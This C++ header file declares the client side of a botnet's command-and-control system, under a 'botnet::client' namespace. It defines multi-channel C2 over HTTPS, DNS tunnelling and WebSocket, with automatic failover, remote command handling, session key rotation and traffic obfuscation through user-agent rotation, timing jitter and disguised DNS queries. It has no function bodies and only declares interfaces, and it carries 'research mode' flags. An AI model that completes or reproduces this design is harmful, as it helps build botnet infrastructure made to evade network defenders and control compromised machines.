#pragma once

#include <memory>
#include <string>
#include <vector>
#include <functional>
#include <chrono>
#include <atomic>
#include <mutex>
#include <boost/asio.hpp>
#include "../../../common/protocol/packet_handler.h"
#include "../../../common/protocol/http_client.h"
#include "../../../common/protocol/dns_tunnel.h"
#include "../../../common/protocol/websocket_client.h"
#include "../../../common/crypto/encryption.h"

namespace botnet {
namespace client {
namespace communication {

/**
 * @brief C2 client for bot-server communication - single codebase
 * 
 * Handles all communication with C2 server using multiple channels.
 * Works identically on Windows, Linux, and macOS.
 */
class C2Client {
public:
    enum class ConnectionState {
        DISCONNECTED,
        CONNECTING,
        AUTHENTICATING,
        CONNECTED,
        RECONNECTING,
        ERROR_STATE
    };

    enum class CommunicationChannel {
        HTTPS_PRIMARY,
        HTTPS_FALLBACK,
        DNS_TUNNEL,
        WEBSOCKET,
        WEBSOCKET_SSL
    };

    struct C2Configuration {
        // Server endpoints
        std::vector<std::string> https_endpoints;
        std::vector<std::string> dns_servers;
        std::string dns_base_domain;
        std::vector<std::string> websocket_endpoints;
        
        // Authentication
        std::string client_id;
        std::string client_certificate;
        std::string client_private_key;
        std::string server_public_key;
        
        // Communication settings
        std::chrono::seconds heartbeat_interval{60};
        std::chrono::seconds reconnect_interval{30};
        uint32_t max_reconnect_attempts{10};
        bool enable_fallback{true};
        
        // Encryption
        std::string session_key;
        bool verify_ssl_certificates{true};
        
        // Research mode
        bool research_mode{true};
        std::string research_session_id;
        std::string compliance_token;
        
        // Traffic obfuscation
        bool enable_traffic_obfuscation{true};
        bool enable_user_agent_rotation{true};
        bool enable_timing_jitter{true};
    };

    using MessageCallback = std::function<void(std::unique_ptr<protocol::Message>)>;
    using ConnectionCallback = std::function<void(ConnectionState, const std::string&)>;
    using ErrorCallback = std::function<void(const std::string&)>;

public:
    explicit C2Client(boost::asio::io_context& io_context);
    ~C2Client();

    // Core operations
    bool Initialize(const C2Configuration& config);
    bool Connect();
    void Disconnect();
    bool IsConnected() const;
    ConnectionState GetConnectionState() const;
    
    // Message operations
    bool SendMessage(std::unique_ptr<protocol::Message> message);
    bool SendHeartbeat();
    bool SendCommand(const std::string& command, const nlohmann::json& params);
    bool SendResponse(const std::string& correlation_id, const nlohmann::json& response);
    
    // Authentication
    bool PerformHandshake();
    bool Authenticate();
    bool RefreshSession();
    
    // Callbacks
    void SetMessageCallback(MessageCallback callback);
    void SetConnectionCallback(ConnectionCallback callback);
    void SetErrorCallback(ErrorCallback callback);
    
    // Configuration updates
    bool UpdateEndpoints(const std::vector<std::string>& new_endpoints);
    bool UpdateHeartbeatInterval(std::chrono::seconds interval);
    bool UpdateEncryptionKey(const std::string& new_key);
    
    // Channel management
    CommunicationChannel GetActiveChannel() const;
    bool SwitchChannel(CommunicationChannel channel);
    std::vector<CommunicationChannel> GetAvailableChannels() const;
    
    // Statistics
    struct ConnectionStats {
        std::chrono::system_clock::time_point connection_start;
        std::chrono::system_clock::time_point last_message_sent;
        std::chrono::system_clock::time_point last_message_received;
        uint32_t messages_sent;
        uint32_t messages_received;
        uint32_t heartbeats_sent;
        uint32_t reconnection_attempts;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        CommunicationChannel active_channel;
        std::chrono::milliseconds average_latency;
    };
    
    ConnectionStats GetStatistics() const;
    void ResetStatistics();
    
    // Research mode
    void EnableResearchMode(const std::string& session_id, const std::string& compliance_token);
    std::vector<std::string> GetCommunicationLog() const;

private:
    boost::asio::io_context& io_context_;
    
    // Communication channels
    std::unique_ptr<protocol::HTTPSClient> https_client_;
    std::unique_ptr<protocol::DNSTunnelClient> dns_client_;
    std::unique_ptr<protocol::WebSocketClient> websocket_client_;
    
    // Encryption and authentication
    std::unique_ptr<crypto::AESEncryption> session_encryption_;
    std::unique_ptr<crypto::RSAKeyPair> client_keys_;
    std::unique_ptr<crypto::RSAKeyPair> server_public_key_;
    
    // State management
    std::atomic<ConnectionState> connection_state_;
    CommunicationChannel active_channel_;
    C2Configuration config_;
    mutable std::mutex config_mutex_;
    
    // Connection management
    std::unique_ptr<boost::asio::steady_timer> heartbeat_timer_;
    std::unique_ptr<boost::asio::steady_timer> reconnect_timer_;
    uint32_t current_reconnect_attempts_;
    
    // Callbacks
    MessageCallback message_callback_;
    ConnectionCallback connection_callback_;
    ErrorCallback error_callback_;
    
    // Statistics
    mutable std::mutex stats_mutex_;
    ConnectionStats stats_;
    
    // Research logging
    mutable std::vector<std::string> communication_log_;
    mutable std::mutex log_mutex_;
    
    // Internal methods
    void SetConnectionState(ConnectionState state, const std::string& details = "");
    
    // Channel implementations
    bool ConnectHTTPS();
    bool ConnectDNSTunnel();
    bool ConnectWebSocket();
    
    bool SendMessageHTTPS(std::unique_ptr<protocol::Message> message);
    bool SendMessageDNS(std::unique_ptr<protocol::Message> message);
    bool SendMessageWebSocket(std::unique_ptr<protocol::Message> message);
    
    // Authentication flow
    bool SendHandshakeRequest();
    bool ProcessHandshakeResponse(std::unique_ptr<protocol::Message> response);
    bool SendAuthenticationRequest();
    bool ProcessAuthenticationResponse(std::unique_ptr<protocol::Message> response);
    
    // Heartbeat management
    void StartHeartbeat();
    void StopHeartbeat();
    void HandleHeartbeatTimer(const boost::system::error_code& ec);
    
    // Reconnection logic
    void StartReconnection();
    void HandleReconnectTimer(const boost::system::error_code& ec);
    bool TryNextChannel();
    
    // Message handling
    void HandleIncomingMessage(std::unique_ptr<protocol::Message> message);
    void ProcessCommand(const protocol::CommandRequest& command);
    void ProcessKeyRotation(std::unique_ptr<protocol::Message> message);
    void ProcessEmergencyStop(std::unique_ptr<protocol::Message> message);
    
    // Encryption key management
    bool RotateSessionKey();
    bool DeriveSessionKey(const std::string& shared_secret);
    
    // Error handling
    void HandleConnectionError(const std::string& error);
    void HandleChannelError(CommunicationChannel channel, const std::string& error);
    
    // Research logging
    void LogCommunicationActivity(const std::string& activity);
    
    // Statistics updates
    void UpdateMessageStats(bool sent, size_t bytes);
    void UpdateLatencyStats(std::chrono::milliseconds latency);
};

/**
 * @brief Handshake manager for initial C2 authentication
 */
class HandshakeManager {
public:
    struct HandshakeResult {
        bool success;
        std::string session_key;
        std::string server_certificate;
        std::vector<std::string> enabled_features;
        std::chrono::seconds heartbeat_interval;
        std::string error_message;
    };

public:
    explicit HandshakeManager(C2Client& parent);
    ~HandshakeManager();

    HandshakeResult PerformHandshake(const C2Client::C2Configuration& config);
    bool ValidateServerCertificate(const std::string& certificate);
    bool VerifyHandshakeSignature(const protocol::HandshakeResponse& response);

private:
    C2Client& parent_;
    
    protocol::HandshakeRequest CreateHandshakeRequest(const C2Client::C2Configuration& config);
    std::string GenerateClientChallenge();
    bool ValidateServerChallenge(const std::string& challenge, const std::string& response);
    std::string ComputeSharedSecret(const std::string& server_public_key);
};

/**
 * @brief Session manager for maintaining C2 session state
 */
class SessionManager {
public:
    struct SessionInfo {
        std::string session_id;
        std::string session_key;
        std::chrono::system_clock::time_point created_at;
        std::chrono::system_clock::time_point expires_at;
        std::chrono::system_clock::time_point last_activity;
        bool active;
        uint32_t message_count;
        std::string server_fingerprint;
    };

public:
    explicit SessionManager(C2Client& parent);
    ~SessionManager();

    bool CreateSession(const std::string& session_key, const std::string& server_fingerprint);
    bool RefreshSession();
    bool DestroySession();
    
    SessionInfo GetSessionInfo() const;
    bool IsSessionValid() const;
    bool IsSessionExpired() const;
    
    void UpdateActivity();
    void IncrementMessageCount();

private:
    C2Client& parent_;
    SessionInfo session_info_;
    mutable std::mutex session_mutex_;
    
    std::string GenerateSessionId();
    std::chrono::system_clock::time_point CalculateExpiry();
};

/**
 * @brief Failover manager for channel switching and redundancy
 */
class FailoverManager {
public:
    struct ChannelStatus {
        C2Client::CommunicationChannel channel;
        bool available;
        std::chrono::system_clock::time_point last_success;
        std::chrono::system_clock::time_point last_failure;
        uint32_t failure_count;
        std::chrono::milliseconds average_latency;
        bool preferred;
    };

public:
    explicit FailoverManager(C2Client& parent);
    ~FailoverManager();

    bool Initialize(const C2Client::C2Configuration& config);
    
    C2Client::CommunicationChannel SelectBestChannel();
    bool SwitchToChannel(C2Client::CommunicationChannel channel);
    void ReportChannelSuccess(C2Client::CommunicationChannel channel, std::chrono::milliseconds latency);
    void ReportChannelFailure(C2Client::CommunicationChannel channel, const std::string& error);
    
    std::vector<ChannelStatus> GetChannelStatuses() const;
    bool IsChannelAvailable(C2Client::CommunicationChannel channel) const;

private:
    C2Client& parent_;
    std::map<C2Client::CommunicationChannel, ChannelStatus> channel_statuses_;
    mutable std::mutex channels_mutex_;
    
    void InitializeChannelStatuses();
    void UpdateChannelPriorities();
    bool TestChannelConnectivity(C2Client::CommunicationChannel channel);
    
    // Channel priority calculation
    double CalculateChannelScore(const ChannelStatus& status) const;
    void AdjustChannelPriorities();
};

/**
 * @brief Message queue for reliable message delivery
 */
class MessageQueue {
public:
    struct QueuedMessage {
        std::unique_ptr<protocol::Message> message;
        std::chrono::system_clock::time_point created_at;
        std::chrono::system_clock::time_point expires_at;
        uint32_t retry_count;
        uint32_t max_retries;
        protocol::MessagePriority priority;
    };

public:
    explicit MessageQueue(size_t max_size = 1000);
    ~MessageQueue();

    bool Enqueue(std::unique_ptr<protocol::Message> message, 
                protocol::MessagePriority priority = protocol::MessagePriority::NORMAL,
                uint32_t max_retries = 3);
    std::unique_ptr<protocol::Message> Dequeue();
    std::unique_ptr<protocol::Message> DequeueHighestPriority();
    
    size_t Size() const;
    bool Empty() const;
    bool Full() const;
    void Clear();
    
    // Retry management
    bool RequeuePreviousMessage(std::unique_ptr<protocol::Message> message);
    void CleanupExpiredMessages();
    
    // Statistics
    struct QueueStats {
        uint32_t total_enqueued;
        uint32_t total_dequeued;
        uint32_t messages_expired;
        uint32_t messages_retried;
        size_t current_size;
        size_t high_water_mark;
    };
    
    QueueStats GetStatistics() const;

private:
    std::queue<QueuedMessage> message_queue_;
    std::priority_queue<QueuedMessage> priority_queue_;
    mutable std::mutex queue_mutex_;
    std::condition_variable queue_condition_;
    
    size_t max_size_;
    bool use_priority_queue_;
    
    mutable std::mutex stats_mutex_;
    QueueStats stats_;
    
    bool IsMessageExpired(const QueuedMessage& queued_msg) const;
    void UpdateStatistics(bool enqueued, bool expired = false, bool retried = false);
};

/**
 * @brief Traffic obfuscation for C2 communications
 */
class TrafficObfuscator {
public:
    explicit TrafficObfuscator(bool research_mode = true);
    ~TrafficObfuscator();

    // HTTP obfuscation
    void ObfuscateHTTPRequest(protocol::HTTPSClient::RequestConfig& request);
    void AddHTTPHeaders(std::map<std::string, std::string>& headers);
    std::string GetRandomUserAgent();
    
    // DNS obfuscation
    std::string ObfuscateDNSQuery(const std::string& original_query);
    void AddDNSJitter();
    
    // WebSocket obfuscation
    void ObfuscateWebSocketHandshake(std::map<std::string, std::string>& headers);
    
    // Timing obfuscation
    void AddCommunicationDelay();
    std::chrono::milliseconds GetJitteredInterval(std::chrono::seconds base_interval);
    
    // Research mode obfuscation
    void AddResearchHeaders(std::map<std::string, std::string>& headers);
    void MarkTrafficAsResearch();

private:
    bool research_mode_;
    mutable std::mt19937 rng_;
    
    std::vector<std::string> user_agents_;
    std::vector<std::string> http_headers_;
    
    void InitializeUserAgents();
    void InitializeHTTPHeaders();
    
    std::string GenerateRandomString(size_t length);
    void AddRandomHeaders(std::map<std::string, std::string>& headers, size_t count = 2);
};

} // namespace communication
} // namespace client
} // namespace botnet
